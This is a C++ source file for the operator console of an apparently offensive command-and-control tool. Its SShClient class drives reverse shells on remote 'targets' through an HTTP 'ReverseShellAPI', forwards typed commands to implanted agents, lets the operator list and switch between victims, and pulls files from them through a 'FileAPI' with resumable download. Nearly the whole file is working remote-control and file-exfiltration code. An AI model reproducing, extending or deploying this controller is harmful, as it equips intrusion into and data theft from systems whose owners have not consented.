#include <sys/select.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <fcntl.h>

#include "SShClient.h"
#include "CC.h"

extern std::map<string, string> url;

/**
 * @brief The only internal interface
 *        that starting to control one target
 * @return the status of exitting control by this time
 */
int SShClient::start() {
    if (!again_) {
        init();
    }

    switch (runshell()) {
        case ERROR:
            return ERROR;

        case CLOSE:
            return CLOSE;

        case STOP:
            return STOP;
    }
}

void SShClient::init() {
    int            imf;
    struct winsize ws;
    struct termios tp, tr;
    const char*    term = getenv("TERM");
    if (term == NULL) {
        term = "vt100";
    }
    if (isatty(0)) {
        /* set the interactive mode flag */
        imf = 1;

        if (ioctl(0, TIOCGWINSZ, &ws) < 0) {
            perror("ioctl(TIOCGWINSZ)");
        }
    } else {
        /* fallback on standard settings */

        ws.ws_row = 25;
        ws.ws_col = 80;
    }
    char message[4];
    message[0] = (ws.ws_row >> 8) & 0xFF;
    message[1] = (ws.ws_row) & 0xFF;

    message[2] = (ws.ws_col >> 8) & 0xFF;
    message[3] = (ws.ws_col) & 0xFF;

    HttpResquest* request = new HttpResquest();
    request->setUrl(URL_["ReverseShellAPI"]);
    request->addHeader("Term", term);
    request->setBody(message, 4);
    request->createRequest(&(httpHandler_->outBuff_));

    int Errno;
    httpHandler_->write(&Errno);
}

void SShClient::reset() {
    if (again_) {
        // just send url notice agent shell-again
        HttpResquest* request = new HttpResquest();
        request->setUrl(URL_["ReverseShellAPI"]);
        request->createRequest(&(httpHandler_->outBuff_));
        int Errno;
        httpHandler_->write(&Errno);
    }
}

/**
 * @brief core code area of Interactive shell,
 *        this is a loop that can jump to each other
 * @return the status(reason) why break out of the shell-loop
 */
int SShClient::runshell() {
    fd_set rd;
    int    ret;
    reset();

    while (1) {
        FD_ZERO(&rd);
        FD_SET(httpHandler_->getFd(), &rd);
        FD_SET(0, &rd);

        httpHandler_->resetParse();

        if (select(httpHandler_->getFd() + 1, &rd, NULL, NULL, NULL) < 0) {
            perror("select");
            return -1;
        }

        if (FD_ISSET(httpHandler_->getFd(), &rd)) {
            ret = _events_terminal_writable();
            if (ret != SUCCESS)
                return ret;
        }

        if (FD_ISSET(0, &rd)) {
            ret = _events_terminal_readable();
            if (ret != SUCCESS)
                return ret;
        }
    }
}

/**
 * @brief Output the response-data of agent to the terminal
 * @return SOCKET_IO STATUS
 */
int SShClient::_events_terminal_writable() {
    int ret = 0;
    int Errno;

    while (!httpHandler_->parseFinish()) {
        ret = httpHandler_->read(&Errno);

        if (ret == 0) {
            std::cout << "\n";
            LOG(ERROR) << "target" << id_ << ":agent is closed";
            return CLOSE;
        } else if (ret < 0) {
            std::cout << "\n";
            LOG(ERROR) << "target" << id_
                       << ":CC read it error Errno:" << Errno;
            return ERROR;
        }

        if (httpHandler_->parseResponse() != HttpResponse::GotAll)
            continue;
    }

    int len = std::stoi(httpHandler_->getHeader("Content-Length"));
    // ::write(1, "\r", 1);

    // if (login_) {
    //     httpHandler_->throwAwayBody();
    //     cc_->CC_print_linePrompt(id_);
    //     again_ = false;
    // } else{
    ret = httpHandler_->getBodyToFd(1, len, &Errno);
    // }

    return SUCCESS;
}

/**
 * @brief Process the input data of the terminal
 * @return SOCKET_IO STATUS、exit status
 */
int SShClient::_events_terminal_readable() {
    int                 id        = id_;
    string              cmd       = SSH_get_line(&id);
    std::vector<string> splitCmds = _split(cmd, ' ');

    // 1. filter the cmd that defined by ourself
    if (!splitCmds.empty()) {
        switch (filterCmds_[splitCmds[0]]) {
            case 1:
                cc_->CC_help_printf();
                cc_->CC_print_linePrompt(id);
                return SUCCESS;

            case 2:
                cc_->CC_target_list();
                cc_->CC_print_linePrompt(id);
                return SUCCESS;

            case 3: {
                again_ = true;
                // access another target shell-loop
                int retStatus = cc_->CC_target_select(id);
                // return to main console whatever the retStatus is, because
                // the call return means CC break out of the loop

                return STOP;
            }

            case 4:
                cc_->CC_target_current();
                cc_->CC_print_linePrompt(id);
                return SUCCESS;

            case 5: {
                std::shared_ptr<HttpResponse> httpHandler2_ =
                    std::make_shared<HttpResponse>(
                        cc_->getAgent(id_)->Information_->fileFd);

                if (splitCmds[1] == "-d") {
                    FileManager::getInstance()->File_pushJob(std::bind(
                        onFileDownload_, httpHandler2_, splitCmds));
                } else {
                    getFile(httpHandler2_, splitCmds);
                }

                // cc_->CC_print_linePrompt(id);
                return SUCCESS;
            }

            case 6: {
                std::shared_ptr<HttpResponse> httpHandler2_ =
                    std::make_shared<HttpResponse>(
                        cc_->getAgent(id_)->Information_->fileFd);

                if (splitCmds[1] == "-d") {
                    FileManager::getInstance()->File_pushJob(
                        std::bind(onFileUpload_, httpHandler2_, splitCmds));
                } else {
                    putFile(this->httpHandler_, splitCmds);
                }

                // cc_->CC_print_linePrompt(id);
                return SUCCESS;
            }

            case 7:
                std::cout << std::endl;
                return STOP;

            default:
                break;
        }
    } else {
        // case 8
        return SUCCESS;
    }

    // 2. system cmd send to agent
    cmd += "\r";

    int          Errno = 0, ret = 0;
    HttpResquest request;
    request.setUrl(URL_["ReverseShellAPI"]);
    request.setBody(cmd.data(), cmd.length());
    request.createRequest(&(httpHandler_->outBuff_));
    ret = httpHandler_->write(&Errno);

    return SUCCESS;
}

int SShClient::putFile(std::shared_ptr<HttpResponse> httpHandler_,
                       std::vector<string>           splitCmd_) {
    return 0;
}

#define DEBUG 0
/**
 * @brief Downlode file from gent
 *        func: fragmentation、breakpoint continuation
 * @param param1: httpHandler for this request
 *        param2: the splited cmd
 * @return status of this request-handle
 */
int SShClient::getFile(std::shared_ptr<HttpResponse> httpHandler,
                       std::vector<string>           splitCmd) {
    string Rpath;
    string Lpath;
    if (splitCmd[0] == "get") {
        if (splitCmd[1] == "-d") {
            Rpath = splitCmd[2];  // remote
            Lpath = splitCmd[3];  // local
        } else {
            Rpath = splitCmd[1];
            Lpath = splitCmd[2];
        }

        // check the validity of the local path
        struct stat buffer;
        if (stat(Lpath.c_str(), &buffer) < 0) {
            std::cout << errno << "\n";
            perror("stat error");
        }
        if (access(Lpath.c_str(), 0) != F_OK ||
            stat(Lpath.c_str(), &buffer) != 0 ||
            (!S_ISDIR(buffer.st_mode))) {
            std::cout << "\n[invalid local path]:httpHandler "
                         "Please check "
                         "and try again\n";
            splitCmd.clear();
            return ERROR;
        }
    }

    int ret, Errno, fd;
    int haveRecvd      = 0;
    int filesize       = -1;
    int Content_Length = 0;

    int T1_body = 0;
    int T2_body = 0;

    HttpResquest request;
    request.setUrl(URL_["FileAPI"]);
    request.setMethod("GET");
    request.setQuery(Rpath);
    string body = "get";
    request.setBody(body.data(), body.size());
    request.createRequest(&(httpHandler->outBuff_));
    ret = httpHandler->write(&Errno);

    string filename =
        Lpath + "/" + basename(const_cast<char*>(Rpath.c_str()));

    fd = open(filename.c_str(), O_RDWR | O_CREAT, 0644);

    bool pro_bar         = true;
    char cThreadName[32] = {0};
    prctl(PR_GET_NAME, (unsigned long)cThreadName);
    string ThreadName(cThreadName, cThreadName + strlen(cThreadName));

    if (ThreadName == "FileManager") {
        pro_bar = false;
    } else
        std::cout << "\n Downloading Please wait...\n";

    while (haveRecvd != filesize) {
        httpHandler->resetParse();
        httpHandler->inBuff_.retrieveAll();

#if DEBUG
        std::cout << " BufferSize:" << httpHandler->inBuff_.printfBufSize();
#endif

        while (!httpHandler->parseFinish()) {
            ret = httpHandler->read(&Errno);
            if (ret == 0)
                return CLOSE;
            else if (ret < 0)
                return ERROR;
            else
                httpHandler->parseResponse();
        }

        if (httpHandler->getCode() == 404) {
            std::cout << "\n[ftpServer error] error msg: "
                      << httpHandler->getMsg() << "\n";
            return ERROR;
        }

        if (httpHandler->getCode() == 200) {
            // T1: getBodyToFd whatever it's a less-pack or sticky-pack
            filesize = std::stoi(httpHandler->getHeader("Ftp-Size"));
            Content_Length =
                std::stoi(httpHandler->getHeader("Content-Length"));

#if DEBUG
            std::cout << "	T1尝试收取:" << ret
                      << "	去掉头还剩(可能粘包了)"
                      << httpHandler->inBuff_.readableBytes()
                      << "	实际body" << Content_Length << "\n";
#endif

            int T1_body =
                Content_Length > httpHandler->inBuff_.readableBytes()
                    ? httpHandler->inBuff_.readableBytes()
                    : Content_Length;

            ret = httpHandler->getBodyToFd(fd, T1_body, &Errno);
            if (ret != T1_body) {
                std::cout << "ftp-client error" << Errno << "\n";
                return ERROR;
            }

            haveRecvd += T1_body;

            // T2: a less-pack case
            if (T1_body < Content_Length) {
                int T2_body = Content_Length - T1_body;
                httpHandler->inBuff_.ensureWriteableBytes(T2_body);
                ret = httpHandler->inBuff_.readN(httpHandler->getFd(),
                                                 T2_body, &Errno);
#if DEBUG
                std::cout << "T2_body:" << T2_body << "\n";
                std::cout << "T2_ret:" << ret << "\n";
#endif
                if (ret != T2_body) {
                    std::cout << "ftp-client error" << Errno << "\n";
                    return ERROR;
                }

                ret = httpHandler->getBodyToFd(fd, T2_body, &Errno);
                if (ret != T2_body) {
                    std::cout << "ftp-client error" << Errno << "\n";
                    return ERROR;
                }

                haveRecvd += T2_body;
                ;
            }
            if (pro_bar) {
                _progress_bar(filename.c_str(), haveRecvd, filesize);
            }
        }
    }

    if(!pro_bar)
    {
        string tem = " target:";
        string msg = "[download successfully]:" + tem + cc_->getAgent(id_)->Information_->ip_ + 
                     ", " + filename + " ,total:" + std::to_string(filesize);
                cc_->msg_notify(msg);
    }
     
    // std::cout << "\n";
    return SUCCESS;
}

string SShClient::SSH_get_line(int* id) {
    cc_->CC_print_linePrompt(*id);
    string cmd;
    getline(std::cin, cmd);

    if (cmd.substr(0, 6) == "target") {
        if (cmd[6] != ' ' || cmd.size() < 8) {
            return "error";
        } else {
            *id = std::stoi(cmd.substr(7));
            return "target";
        }
    }

    return cmd;
}

std::vector<string> SShClient::_split(const string& str, char pattern) {
    std::vector<string> res;
    if (str == "")
        return res;

    string strs = str + pattern;
    size_t pos  = strs.find(pattern);

    while (pos != strs.npos) {
        string temp = strs.substr(0, pos);
        res.push_back(temp);
        while (pos < strs.length() && strs[pos] == pattern) {
            pos++;
        }

        strs = strs.substr(pos, strs.size());
        pos  = strs.find(pattern);
    }

    return res;
}

int SShClient::_preFtp(std::vector<string>& splitCmd) {
    if (splitCmd[0] == "get") {
        string Rpath;
        string Lpath;
        if (splitCmd[1] == "-d") {
            Rpath = splitCmd[2];  // remote
            Lpath = splitCmd[3];  // local
        } else {
            Rpath = splitCmd[1];  // remote
            Lpath = splitCmd[2];  // local
        }

        struct stat buffer;
        if (access(Lpath.c_str(), 0) != F_OK ||
            stat(Lpath.c_str(), &buffer) != 0 ||
            (!S_ISDIR(buffer.st_mode))) {
            std::cout << "\n[invalid local path]: Please check and "
                         "try again\n";
            splitCmd.clear();
            return ERROR;
        }

        return 0;
    } else if (splitCmd[0] == "put") {
        string Lpath = splitCmd[1];
        string Rpath = splitCmd[2];

        struct stat buffer;
        if (access(Lpath.c_str(), 0) != F_OK ||
            stat(Lpath.c_str(), &buffer) != 0 ||
            (!S_ISREG(buffer.st_mode))) {
            std::cout << "\n[invalid local path]: Please check and "
                         "try again\n";
            splitCmd.clear();
            return ERROR;
        }
        return 0;
    } else {
        std::cout
            << "\n[invalid file-cmd-kw]: Please check and try again\n";
        splitCmd.clear();
        return ERROR;
    }
}

/**
 * @brief file tran progress bar
 * @param p1: filename
 *        p2: completed
 *        p3: file size
 */
void SShClient::_progress_bar(const char* file_name, float sum,
                              float file_size) {
    float percent = (sum / file_size) * 100;
    char* sign    = "#";
    if ((int)percent != 0) {
        sign = (char*)malloc((int)percent + 1);
        strncpy(sign,
                "####################################################",
                (int)percent);
    }
    printf("%s %7.2f%% [%-*.*s] %.2f/%.2f mb\r", file_name, percent, 50,
           (int)percent / 2, sign, sum / 1024.0 / 1024.0,
           file_size / 1024.0 / 1024.0);
    if ((int)percent != 0)
        free(sign);
    fflush(stdout);
}
